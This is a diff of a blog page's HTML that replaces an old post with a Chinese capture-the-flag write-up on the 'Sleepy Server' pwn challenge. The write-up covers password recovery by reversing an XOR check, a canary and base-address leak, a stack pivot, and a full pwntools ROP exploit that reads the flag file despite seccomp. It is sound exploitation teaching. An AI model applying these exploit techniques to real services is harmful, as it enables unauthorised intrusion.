@@ -22,7 +22,7 @@
     <meta name="description" content="hurricane618's blog">
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>新的开始 · 风之栖息地|hurricane618&#39;s blog</title>
+    <title>CNSS招新题中的一道ROP题 · 风之栖息地|hurricane618&#39;s blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -228,7 +228,7 @@
                 <a href="/">风之栖息地</a>
             </div>
             <div class="post-title">
-                <a href="#" class="post-name">新的开始</a>
+                <a href="#" class="post-name">CNSS招新题中的一道ROP题</a>
             </div>
     </div>
     
@@ -258,7 +258,7 @@ height:50vh;
         <h1 class="intro-title">
             <!-- 主页  -->
             
-            新的开始
+            CNSS招新题中的一道ROP题
             <!-- 404 -->
             
         </h1>
@@ -277,18 +277,18 @@ height:50vh;
                 
                     <div class="post-intro-tags">
     
-        <a class="post-tag" href="javascript:void(0);" data-tags="闲聊">闲聊</a>
+        <a class="post-tag" href="javascript:void(0);" data-tags="ROP">ROP</a>
     
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">77</span>阅读时长: <span class="post-count reading-time">1 min</span></span>
+                        <span>字数统计: <span class="post-count word-count">1.5k</span>阅读时长: <span class="post-count reading-time">6 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
                     <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2018/06/26</span>
+                    <span class="post-intro-time">2019/11/11</span>
                     
                     <span id="busuanzi_container_page_pv" class="busuanzi-pv">
                         <span class="iconfont-archer">&#xe602;</span>
@@ -412,17 +412,44 @@ height:50vh;
         <div class="container container-unloaded">
             <main class="main post-page">
     <article class="article-entry">
-        <p>之前的博客荒废掉了，所以在github上开一个新的博客希望能够坚持下去吧。也不讲太多矫情的话了，撸起袖子就是肝。</p>
-<p>一开始会更新的比较慢，hexo的博客还需要一段时间适应，之后会逐渐加快。</p>
-<img src="/2018/06/26/new-start/67863722_p0.png">
+        <p>CNSS招新题目中有两道不错的Pwn题，拿来学习一波知识。然而其中有一道是内核ROP，复现了好几天。。还是有点问题，再加上研究生大作业集群来了（完全不能摸鱼，哭唧唧），所以那道内核题能做出来就放博客。</p>
+<h2 id="Sleepy-Server"><a href="#Sleepy-Server" class="headerlink" title="Sleepy Server"></a>Sleepy Server</h2><p>这道题checksec发现防御全开，同时给了libseccomp，看来是对libc的调用有一定限制。</p>
+<img src="/2019/11/11/cnss-recruit-pwn-1/1.png">
+<p>可以看到禁用了execve，不能通过直接拿shell获得flag。开始分析整个程序，看看有什么利用点。</p>
+<img src="/2019/11/11/cnss-recruit-pwn-1/2.png">
+<p>比较容易的就能看到<code>buf</code>有一个溢出，但是溢出的数量有限只有0x10字节，随后看到我们输入的用户名和密码被传入一个函数判断，判断的结果正确才会进入漏洞点，我们继续跟进<code>sub_E9D</code>函数。</p>
+<img src="/2019/11/11/cnss-recruit-pwn-1/3.png">
+<p>在这里我们发现只对<code>a2</code>有相关操作，也就是我们输入的密码。首先一个临时数组保存<code>v3 ^ a2[i]</code>的数据，并且将这个数据更新到<code>v3</code>上。也就是说每次异或操作都是和上一轮异或的结果和这轮的字符，同时临时保存的每轮异或数据要和<code>v8</code>开始的一系列值相等。</p>
+<p>从上面看一共有12个值，那么密码的长度肯定是12，这样我们有每轮异或最后的结果可以异或操作逆推回去。原始输入的结果就等于这轮异或结果与上一轮异或结果相异或，然后第一轮是这轮结果与0异或得到。解密代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">data = [<span class="number">115</span>, <span class="number">7</span>, <span class="number">98</span>, <span class="number">18</span>, <span class="number">77</span>, <span class="number">47</span>, <span class="number">86</span>, <span class="number">9</span>, <span class="number">122</span>, <span class="number">14</span>, <span class="number">107</span>, <span class="number">27</span>]</span><br><span class="line">v3 = <span class="number">0</span></span><br><span class="line">passwd = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> data:</span><br><span class="line">    passwd += chr(i ^ v3)</span><br><span class="line">    v3 = i</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> passwd</span><br></pre></td></tr></table></figure>
+<p>最后拿到的密码是<code>step_by_step</code>，这样我们就能顺利进入漏洞触发点了。</p>
+<p>我们继续看<code>main</code>函数，同样很容易发现有两次<code>printf</code>，由于程序是开启了<code>canary</code>保护的，我们需要先泄露才行，而这里有两次输出，那么第一次输出就是为了泄露数据。最后8个字节为<code>canary</code>，通常这个值的最低位为0，我们也是只需要把这个0覆盖掉，就能让<code>printf</code>把后面的<code>canary</code>和<code>rbp</code>一起输出。有了<code>rbp</code>的数据我们能通过调试知道这个<code>rbp</code>和程序的起始地址的差值，从而得到程序的起始基地址，从而同时解决了地址随机化的问题。</p>
+<p>现在目光集中在下一次输入的溢出上，这里只能溢出16字节，这意味着我们只能覆盖<code>rbp</code>和<code>ret_address</code>，溢出位数不够怎么解决？现在我的思路有两个</p>
+<ol>
+<li>利用<code>one_gadget</code>一次性获得shell（可能性较小，因为seccomp的原因）</li>
+<li>移动栈帧，把栈帧移动到我们能写入的地方，以此来构造ROP chain</li>
+</ol>
+<p>使用<code>one_gadget</code>进行尝试，意料之中的失败。。ROP大师的题目果然是不能偷鸡成功的。</p>
+<p>移动栈帧的<code>leave ret</code>在程序中比较常用，还是很好找，同时我们有程序的基地址也就能找到我们写入的地址。</p>
+<p>第一次的返回地址填入漏洞点的上方，也是为了在第一次读入数据之后再次获得读入数据的机会，然后第二次读入的时候<code>rbp</code>填入我们的可控地址，返回地址填入<code>leave ret</code>的gadget。这样在read之后会调用一次<code>leave</code>，<code>ret</code>之后又会有第二次<code>leave</code>来让栈帧移动。随后就是无限重复第二次动作，来完成ROP。exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># This exploit template was generated via:</span></span><br><span class="line"><span class="comment"># $ pwn template rop</span></span><br><span class="line"><span class="comment"># Author: hurricane618</span></span><br><span class="line"><span class="comment"># E-mail: hurricane618@hotmail.com</span></span><br><span class="line"><span class="comment"># Website: hurricane618.me</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># Set up pwntools for the correct architecture</span></span><br><span class="line">exe = ELF(<span class="string">'./'</span> + <span class="string">'rop'</span>)</span><br><span class="line">context.binary = <span class="string">'./'</span> + <span class="string">'rop'</span></span><br><span class="line"><span class="comment">#libc = exe.libc</span></span><br><span class="line">libc = ELF(<span class="string">'./libc-2.27.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment">#                    EXPLOIT GOES HERE</span></span><br><span class="line"><span class="comment">#===========================================================</span></span><br><span class="line"><span class="comment"># Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment"># RELRO:    Full RELRO</span></span><br><span class="line"><span class="comment"># Stack:    Canary found</span></span><br><span class="line"><span class="comment"># NX:       NX enabled</span></span><br><span class="line"><span class="comment"># PIE:      PIE enabled</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'DEBUG'</span>]:</span><br><span class="line">    context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">    io = remote(<span class="string">'139.9.5.20'</span>, <span class="string">'60607'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(exe.path, env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"./libseccomp.so.2"</span>&#125;)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="number">0xb8</span> * <span class="string">'a'</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'name: '</span>)</span><br><span class="line">io.sendline(<span class="string">'whz'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'Password: '</span>)</span><br><span class="line">io.sendline(<span class="string">'step_by_step'</span>)</span><br><span class="line">io.recvuntil(<span class="string">'tell me what you say\n'</span>)</span><br><span class="line">pause()</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="number">0xb8</span> * <span class="string">'a'</span> + <span class="string">'\n'</span>)</span><br><span class="line">canary = u64(<span class="string">'\x00'</span> + io.recv(<span class="number">7</span>))</span><br><span class="line">elf_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x1180</span></span><br><span class="line">info(<span class="string">'canary:'</span>+hex(canary))</span><br><span class="line">info(<span class="string">'elf_base:'</span>+hex(elf_base))</span><br><span class="line"></span><br><span class="line">bss=elf_base+<span class="number">0x00202500</span> <span class="comment">#这里不是bss段 但是是一段空白数据区域 可以任意写入</span></span><br><span class="line">buf=bss+<span class="number">0x200</span></span><br><span class="line">buf2=buf+<span class="number">0x200</span></span><br><span class="line">file_place=buf2+<span class="number">0x200</span> <span class="comment"># string ./flag\x00</span></span><br><span class="line">buf3=file_place+<span class="number">0x200</span></span><br><span class="line">file_name=<span class="string">'./flag\x00\x00'</span></span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x11e3</span> + elf_base</span><br><span class="line">pop_rbp_ret = <span class="number">0x0b70</span> + elf_base</span><br><span class="line">read_ret = <span class="number">0x1144</span> + elf_base</span><br><span class="line">leave_ret = <span class="number">0x1176</span> + elf_base</span><br><span class="line">read_got = exe.got[<span class="string">'read'</span>] + elf_base</span><br><span class="line">puts_plt = exe.plt[<span class="string">'puts'</span>] + elf_base</span><br><span class="line">read_plt = exe.plt[<span class="string">'read'</span>] + elf_base</span><br><span class="line"></span><br><span class="line">payload2 = <span class="number">0xb8</span> * <span class="string">'b'</span></span><br><span class="line">payload2 += p64(canary)</span><br><span class="line">payload2 += p64(buf)</span><br><span class="line">payload2 += p64(read_ret)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">'I will go to sleep\n'</span>)</span><br><span class="line">io.send(payload2)</span><br><span class="line"></span><br><span class="line">payload3 = p64(pop_rdi_ret)</span><br><span class="line">payload3 += p64(read_got)</span><br><span class="line">payload3 += p64(puts_plt)</span><br><span class="line">payload3 += p64(pop_rbp_ret)</span><br><span class="line">payload3 += p64(file_place + <span class="number">0xc0</span>)</span><br><span class="line">payload3 += p64(read_ret)</span><br><span class="line">payload3 += <span class="number">17</span> * p64(<span class="number">0</span>) <span class="comment"># padding to len=0xb8</span></span><br><span class="line">payload3 += p64(canary)</span><br><span class="line">payload3 += p64(buf - <span class="number">0xc8</span>)</span><br><span class="line">payload3 += p64(leave_ret)</span><br><span class="line"></span><br><span class="line">io.send(payload3)</span><br><span class="line">read_addr = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">'\x00'</span>))</span><br><span class="line">libc_base = read_addr - libc.symbols[<span class="string">'read'</span>]</span><br><span class="line">info(<span class="string">"libc base:"</span> + hex(libc_base))</span><br><span class="line">pop_rsi_ret = <span class="number">0x23e6a</span> + libc_base</span><br><span class="line">pop_rdx_ret = <span class="number">0x1b96</span> + libc_base</span><br><span class="line">open_addr = libc.symbols[<span class="string">'open'</span>] + libc_base</span><br><span class="line"></span><br><span class="line">payload4 = file_name</span><br><span class="line">payload4 += p64(pop_rdi_ret)</span><br><span class="line">payload4 += p64(file_place)</span><br><span class="line">payload4 += p64(pop_rsi_ret)</span><br><span class="line">payload4 += p64(<span class="number">0</span>)</span><br><span class="line">payload4 += p64(open_addr)</span><br><span class="line">payload4 += p64(pop_rdi_ret)</span><br><span class="line">payload4 += p64(<span class="number">3</span>)</span><br><span class="line">payload4 += p64(pop_rsi_ret)</span><br><span class="line">payload4 += p64(buf3)</span><br><span class="line">payload4 += p64(pop_rdx_ret)</span><br><span class="line">payload4 += p64(<span class="number">0x30</span>)</span><br><span class="line">payload4 += p64(read_plt)</span><br><span class="line">payload4 += p64(pop_rdi_ret)</span><br><span class="line">payload4 += p64(buf3)</span><br><span class="line">payload4 += p64(puts_plt)</span><br><span class="line">payload4 += (<span class="number">0xb8</span> - len(payload4))/<span class="number">8</span> * p64(<span class="number">0</span>)</span><br><span class="line">payload4 += p64(canary)</span><br><span class="line">payload4 += p64(file_place)</span><br><span class="line">payload4 += p64(leave_ret)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">io.send(payload4)</span><br><span class="line">pause()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>一开始不知道如何确定ELF的基地址。。求助了<code>@Tangent</code>得到exp，然后分析之后才知道是可以通过<code>rbp</code>相对位移来确定。之后在复现的过程中也遇到过一些坑：</p>
+<ol>
+<li>用<code>leave ret</code>来移动栈帧的时候要注意移动之后要在目标地址多填充8字节，这是因为<code>leave</code>要<code>pop rbp</code>的原因；</li>
+<li>这里用的libc是libc-2.27，我最先使用的libc-2.23，也是没有注意题目的提醒<code>Ubuntu 18.04</code>；</li>
+<li>还有就是我为了偷懒<code>read</code>读入数据的地址一开始是<code>file_name</code>的地方，结果发现老是读出来的是乱码，调试之后发现明明能成功读取到字符串，然后调<code>puts</code>输出的时候莫名其妙的就不行？？？随后把读入的数据放在其他地方就好了。。。如果有大佬知道是怎么回事的，求告知；</li>
+</ol>
+<img src="/2019/11/11/cnss-recruit-pwn-1/4.png">
+<p>最后拿到flag，<code>cnss{r00oopp_1s_e45y_I_10v3_r0o00op}</code>。</p>
+
     </article>
     <!-- license  -->
     
         <div class="license-wrapper">
             <p>原文作者：<a href="http://hurricane618.me">hurricane618</a>
-            </p><p>原文链接：<a href="http://hurricane618.me/2018/06/26/new-start/">http://hurricane618.me/2018/06/26/new-start/</a>
-            </p><p>发表日期：<a href="http://hurricane618.me/2018/06/26/new-start/">June 26th 2018, 11:10:58 am</a>
-            </p><p>更新日期：<a href="http://hurricane618.me/2018/06/26/new-start/">July 19th 2018, 9:05:30 am</a>
+            </p><p>原文链接：<a href="http://hurricane618.me/2019/11/11/cnss-recruit-pwn-1/">http://hurricane618.me/2019/11/11/cnss-recruit-pwn-1/</a>
+            </p><p>发表日期：<a href="http://hurricane618.me/2019/11/11/cnss-recruit-pwn-1/">November 11th 2019, 10:34:09 am</a>
+            </p><p>更新日期：<a href="http://hurricane618.me/2019/11/11/cnss-recruit-pwn-1/">November 11th 2019, 10:34:09 am</a>
             </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -430,13 +457,13 @@ height:50vh;
     <ul class="post-paginator">
         <li class="next">
             
-                <div class="nextSlogan">Next Post</div>
-                <a href="/2018/06/30/csp-bypass-summary/" title="CSP绕过总结">
-                    <div class="nextTitle">CSP绕过总结</div>
-                </a>
-            
         </li>
         <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2019/09/14/fancy-rop-practice/" title="花式栈溢出学习">
+                    <div class="prevTitle">花式栈溢出学习</div>
+                </a>
             
         </li>
     </ul>
@@ -452,8 +479,8 @@ height:50vh;
     *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
         
         var disqus_config = function () {
-        this.page.url = "http://hurricane618.me/2018/06/26/new-start/";  // Replace PAGE_URL with your page's canonical URL variable
-        this.page.identifier = "新的开始"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+        this.page.url = "http://hurricane618.me/2019/11/11/cnss-recruit-pwn-1/";  // Replace PAGE_URL with your page's canonical URL variable
+        this.page.identifier = "CNSS招新题中的一道ROP题"; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
         };
         
         (function () { // DON'T EDIT BELOW THIS LINE
@@ -577,7 +604,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Sleepy-Server"><span class="toc-number">1.</span> <span class="toc-text">Sleepy Server</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
